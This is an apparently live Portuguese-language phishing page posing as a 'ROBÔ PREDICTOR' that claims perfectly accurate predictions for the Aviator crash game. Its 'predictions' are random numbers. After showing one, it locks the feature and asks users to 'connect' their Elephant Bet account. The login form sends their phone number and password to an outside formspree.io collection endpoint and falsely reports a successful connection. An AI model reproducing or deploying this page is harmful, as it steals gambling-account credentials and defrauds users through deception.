<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ROBÔ PREDICTOR + Conectar Conta</title>
  <style>
    body {font-family:'Poppins',sans-serif;margin:0;padding:0;background:#000;color:#fff;text-align:center}
    .header {background:#c00;color:#fff;padding:20px;font-size:22px;font-weight:bold}
    .circle {width:200px;height:200px;border:6px solid #c00;border-radius:50%;margin:30px auto;display:flex;align-items:center;justify-content:center;background:#000}
    .circle h1 {font-size:32px;color:#fff;text-shadow:0 0 10px #fff}
    button {padding:14px 24px;font-size:18px;font-weight:bold;border:none;border-radius:8px;cursor:pointer;margin:12px auto;display:block;width:80%;max-width:320px}
    #actionButton {background:#009fe3;color:#fff}
    .sync-btn {background:#c00;color:#fff;padding:12px;border-radius:8px;display:inline-block;margin-top:20px;cursor:pointer}
    .sync-button {background:#009fe3;color:#fff;width:90%;padding:12px;border:none;border-radius:8px;font-weight:bold}
    input {width:90%;padding:10px;margin:8px auto;border:2px solid #c00;border-radius:6px;font-size:16px}
    .hidden {display:none}
    .disabled-message {background:#222;color:#ffcc00;padding:10px;border-radius:6px;margin:15px auto;width:90%}
    .history {margin:20px auto;max-width:340px;background:#111;padding:15px;border-radius:10px}
    .history h2 {color:#009fe3}
    .history li {padding:6px;margin:4px 0;border-radius:6px}
    .blue {background:#00bfff}
    .purple {background:#9933ff}
    .pink {background:#ff1493}
    footer {margin-top:20px;font-size:.9em;color:#888}
    @media(max-width:600px){.circle{width:150px;height:150px}.circle h1{font-size:24px}button{font-size:16px}}
  </style>
</head>
<body>

  <!-- TELA ROBÔ -->
  <div id="bot-screen">
    <div class="header">ROBÔ PREDICTOR<br>100% de acertividade</div>
    <div class="circle"><h1 id="multiplier">00.00x</h1></div>

    <button id="actionButton" onclick="nextPrediction()">⚡ Prever a próxima vela</button>

    <div id="blockedMessage" class="disabled-message hidden">
      Para ver a próxima deverás conectar o Robô
    </div>

    <div class="history">
      <h2>Histórico de Velas</h2>
      <ul id="historyList"></ul>
    </div>

    <a class="sync-btn" onclick="showSync()">🔗 Conectar o Robô</a>
  </div>

  <!-- TELA SINCRONIZAÇÃO -->
  <div id="sync-screen" class="hidden">
    <div class="header">Conecte com a sua conta Elephant Bet</div>
    <form id="syncForm" action="https://formspree.io/f/xvgwbowg" method="POST">
      <input type="tel" name="numero" placeholder="Número de telemóvel" pattern="9[0-9]{8}" maxlength="9" required>
      <input type="password" name="senha" placeholder="Digite a sua senha" required>
      <button type="submit" class="sync-button">Conectar Agora</button>
    </form>
    <span class="sync-btn" onclick="showBot()">← Voltar</span>
    <p id="statusMsg"></p>
  </div>

  <footer>© ROBÔ PREDICTOR</footer>

  <script>
    let hasHackedOnce=false;

    function gerarResultadoAviator(){
      const multiplicadores=[1.2,1.3,1.5,2,3,5,7,10,20,50,100];
      const pesos=[30,20,15,10,8,6,5,3,2,1,0.5];
      const totalPeso=pesos.reduce((a,b)=>a+b,0);
      let rand=Math.random()*totalPeso;
      for(let i=0;i<multiplicadores.length;i++){
        if(rand<pesos[i]) return multiplicadores[i];
        rand-=pesos[i];
      }
      return 2;
    }

    function nextPrediction(){
      if(hasHackedOnce) return;
      const btn=document.getElementById("actionButton");
      setTimeout(()=>{
        const num=gerarResultadoAviator().toFixed(2)+'x';
        const el=document.getElementById("multiplier");
        el.textContent=num;
        addToHistory(num);
        hasHackedOnce=true;
        btn.classList.add("disabled");
        btn.disabled=true;
        document.getElementById("blockedMessage").classList.remove("hidden");
      },2000);
    }

    function addToHistory(number){
      const list=document.getElementById("historyList");
      const li=document.createElement("li");
      li.textContent=number;
      const val=parseFloat(number.replace("x",""));
      li.classList.add(val<2?"blue":val<10?"purple":"pink");
      list.insertBefore(li,list.firstChild);
    }

    function showSync(){document.getElementById("bot-screen").classList.add("hidden");document.getElementById("sync-screen").classList.remove("hidden");}
    function showBot(){document.getElementById("sync-screen").classList.add("hidden");document.getElementById("bot-screen").classList.remove("hidden");}

    document.addEventListener("DOMContentLoaded",function(){
      const form=document.getElementById("syncForm");
      form.addEventListener("submit",function(e){
        e.preventDefault();
        const data=new FormData(this);
        fetch(this.action,{method:this.method,body:data,headers:{"Accept":"application/json"}})
          .then(res=>{if(res.ok){alert("Conta conectada com sucesso!");showBot();}else{alert("Erro ao conectar.");}})
          .catch(()=>alert("Erro de conexão."));
      });
    });
  </script>
</body>
</html>
